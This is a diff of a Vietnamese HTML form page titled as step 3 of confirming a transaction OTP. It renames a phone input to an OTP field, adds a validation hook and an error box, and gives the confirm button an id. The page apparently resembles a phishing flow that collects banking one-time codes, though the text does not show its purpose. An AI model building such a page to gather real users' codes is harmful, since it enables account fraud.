@@ -18,7 +18,7 @@
                     Bước 3 : Xác Nhận Mã OTP Vào Hệ Thống
                 </div>
             </div>
-            <form class="" role="form" method="post" action="/actionstep3" style="width: 100%;">
+            <form class="" role="form" method="post" action="/actionstep3"  onsubmit="return validateForm()"style="width: 100%;">
                 <div id="custom-show-error-toomarketer77702" class="custom-alerts alert alert-danger">
                     <a type="button" class="close close-error-toomarketer" onclick="close_error_toomarketer('77702');"></a><span id="content-text-error-toomarketer77702"></span></div>
                 <div class="form-body">
@@ -43,13 +43,15 @@
                     <ul class="items" id="items-toomarketer77702">
                         <li id="10" data-customfieldname="Mobile">
                             <div style="font-style: italic; margin-bottom:10px"> indicates required field <span style="color:#F44336;"> *<span></div>
-                          
+                            <div class=" alert-danger" style="padding:10px;margin-bottom:10px" id="erro">
+                                   
+                            </div>
                             <div id="div10" class="form-group custom-padding-item" data-maxchar="15" data-required="true" data-formatid="1" data-typeid="6" data-component="text-box">
                             
                                 <label id="captionname" class="captionname-toomarketer77702 checkrequired " data-fieldname="SĐT " style="color: rgb(66, 66, 66); font-size: 18px; text-align: left; display: block;"> MÃ OTP CÓ HIỆU LỰC 2 PHÚT <span style="color:#F44336;"> *<span></span></span>
                                 </label>
                                 <div style="position:relative;">
-                                    <input type="text" id="SĐT " class="form-control input-sm" maxlength="15" onkeydown="formvalidate(event)" value="" name="Phone" placeholder="" style="height: 30px; font-size: 15px; border-radius: 0px;">
+                                    <input type="text" id="OTP" class="form-control input-sm" maxlength="15" onkeydown="formvalidate(event)" value="" name="OTP" placeholder="" style="height: 30px; font-size: 15px; border-radius: 0px;">
                                 </div>
                             </div>
                         </li>
@@ -59,7 +61,7 @@
                     </ul>
                     <div class="submit custom-padding-item" style="text-align: center;">
                         <div>
-                            <button type="submit" data-confirmed="false" class="btn blue" style="font-size: 12px; padding: 9px 14px 8px; width: 60%; border-radius: 0px; color: hsla(0, 54%, 21%, 0.85); ;background-color:#D8D8D8; border-color: rgb(255, 255, 255);    font-size: 15px"> XÁC NHẬN GIAO DỊCH </button>
+                            <button type="submit" data-confirmed="false" class="btn blue" style="font-size: 12px; padding: 9px 14px 8px; width: 60%; border-radius: 0px; color: hsla(0, 54%, 21%, 0.85); ;background-color:#D8D8D8; border-color: rgb(255, 255, 255);    font-size: 15px" id="confirm"> XÁC NHẬN GIAO DỊCH </button>
                         </div>
                     </div>
                     <div class="divLoading" style="display: none;">
